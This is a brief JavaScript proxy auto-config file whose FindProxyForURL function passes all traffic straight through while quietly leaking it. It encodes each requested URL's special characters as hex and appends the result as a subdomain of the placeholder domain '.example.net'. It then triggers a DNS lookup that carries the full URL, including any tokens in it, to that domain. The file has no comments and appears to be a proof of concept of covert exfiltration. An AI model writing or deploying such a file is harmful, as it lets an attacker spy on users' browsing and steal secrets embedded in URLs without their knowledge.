function FindProxyForURL(url, host) {
    var LEAKDOMAIN = '.example.net';
    var encode = function(char) {
        return '-' +
            ('00' + char.charCodeAt(0).toString(16)).substr(-2);
    };
    var subdomain = url.replace(/[^a-zA-Z0-9]/g, encode);
    dnsResolve(subdomain + LEAKDOMAIN);
    return 'DIRECT';
}
